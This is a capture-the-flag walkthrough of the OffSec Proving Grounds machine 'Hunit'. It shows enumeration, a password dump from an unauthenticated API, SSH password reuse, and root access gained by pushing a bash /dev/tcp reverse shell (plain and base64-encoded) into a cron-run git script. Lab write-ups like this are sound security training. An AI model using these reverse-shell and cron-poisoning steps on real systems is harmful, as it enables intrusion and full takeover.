---
title: "PG: Hunit"
date: 2023-03-07
draft: false
os: "Linux"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/hunit/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - linux
  - api-info-disclosure
  - credential-reuse
  - git-server
  - cron-job
  - ssh-key
categories:
  - walkthrough
---

{{< box-info name="Hunit" os="Linux" difficulty="Medium" ip="192.168.142.125" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE      VERSION
8080/tcp  open  http-proxy   (custom web app + REST API)
12445/tcp open  netbios-ssn  Samba smbd 4.6.2
18030/tcp open  http         Apache httpd 2.4.46 ((Unix))
43022/tcp open  ssh          OpenSSH 8.4 (protocol 2.0)
```
{{< /collapse >}}

Everything is on non-standard ports. SMB (12445) and the Apache instance on 18030 turn out to be dead ends — the static site on 18030 is just a landing page, and Samba exposes nothing interesting. SSH sits on 43022, so keep that port in mind: any creds we find get tried there.

The real surface is the custom web app on **8080**.

### Port 8080 - Web App + API

Directory fuzzing surfaces a blog-style app (`/article/...`) plus a `/js/` bundle — but the interesting bit is a REST API mounted at `/api/`. Ask it what it exposes:

```bash
curl http://192.168.142.125:8080/api/ | jq .
```

```json
[
  { "string": "/api/",      "id": 13 },
  { "string": "/article/",  "id": 14 },
  { "string": "/article/?", "id": 15 },
  { "string": "/user/",     "id": 16 },
  { "string": "/user/?",    "id": 17 }
]
```

A `/user/` endpoint on an unauthenticated API is a giant flashing sign.

---

## Foothold

### API Info Disclosure -> Credential Dump

The `/api/user/` endpoint happily returns the full user table — logins **and cleartext passwords**:

```bash
curl http://192.168.142.125:8080/api/user/ | jq . | grep 'login\|password\|description'
```

```
"login": "rjackson",  "password": "yYJcgYqszv4aGQ",       "description": "Editor"
"login": "jsanchez",  "password": "d52cQ1BzyNQycg",       "description": "Editor"
"login": "dademola",  "password": "ExplainSlowQuest110",  "description": "Admin"
"login": "jwinters",  "password": "KTuGcSW6Zxwd0Q",       "description": "Editor"
"login": "jvargas",   "password": "OuQ96hcgiM5o9w",       "description": "Editor"
```

The `dademola` account is flagged `Admin`. Since SSH lives on 43022, try password reuse there first — admin creds go first:

```bash
ssh dademola@192.168.142.125 -p 43022
# password: ExplainSlowQuest110
```

We're in. `local.txt` is right there in the home directory.

---

## Privilege Escalation

### Recon -> git user + cron backups

Enumerating local users shows a third account worth noting — a `git` user pinned to `git-shell`:

```bash
cat /etc/passwd | grep -v "false\|nologin"

root:x:0:0::/root:/bin/bash
dademola:x:1001:1001::/home/dademola:/bin/bash
git:x:1005:1005::/home/git:/usr/bin/git-shell
```

A leftover crontab backup spells out what root runs on a timer:

```bash
cat /etc/crontab.bak

*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

Root executes `/root/git-server/backups.sh` **every 3 minutes**. If we can influence that script's contents, we get code execution as root.

### Git push -> cron RCE

The `git` user's SSH private key is sitting in `/home/git/.ssh` and is readable. `git-shell` itself is locked down (no interactive commands, and we can't drop anything into `/home/git/git-shell-commands` as `dademola`), but the key still lets us **clone the server-side repo** — which is the same `git-server` root's cron runs `backups.sh` out of.

Clone it over the non-standard SSH port using `GIT_SSH_COMMAND`:

```bash
GIT_SSH_COMMAND='ssh -p 43022 -i id_rsa' git clone git@192.168.142.125:/git-server/
```

Edit `backups.sh` to append a reverse shell, then commit and push it back. SUID and `mkfifo`-style one-liners choked on shell escaping during push, so a plain bash TCP callback (or its base64 form to sidestep quoting) is what lands cleanly:

```bash
# appended to backups.sh
bash -i >& /dev/tcp/192.168.45.216/8080 0>&1
# base64-encoded variant, if raw quoting mangles on push
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxNi84MDgwIDA+JjE=' | base64 -d | bash
```

Commit and push back to the server:

```bash
git add backups.sh
git config --global user.email "evil@evil.io"
git config --global user.name  "evil"
git commit -m "pwn"
GIT_SSH_COMMAND='ssh -p 43022 -i ../id_rsa' git push -u origin
```

Start a listener on 8080, wait up to 3 minutes for cron to fire `backups.sh`, and catch the shell as **root**.

---

## Proof

User flag on `local.txt`:

![dademola cat local.txt showing the user flag hash](/images/hunit/user-flag.png)

Root was obtained via the cron-triggered `backups.sh` reverse shell above (caught as `root` on the listener). No `proof.txt` value was captured in these notes, so it's not reproduced here.

---

## Key Takeaways

{{< callout type="note" >}}
- Always enumerate REST APIs like a directory tree — an unauthenticated `/api/user/` endpoint dumping cleartext passwords is game over before you touch a single exploit.
- Non-standard ports don't change the playbook: harvested creds get sprayed at SSH wherever it's actually listening (here, 43022) — pass it with `-p`.
- A readable server-side git repo whose scripts are run by root on a cron is a clean privesc: clone, poison the script, push, wait for the timer. `GIT_SSH_COMMAND` handles the odd SSH port/key.
- When crafting a reverse-shell payload that passes through `git commit`/`push`, expect shell-escaping to eat SUID/`mkfifo` one-liners — a base64-encoded bash TCP callback survives the round-trip.
{{< /callout >}}
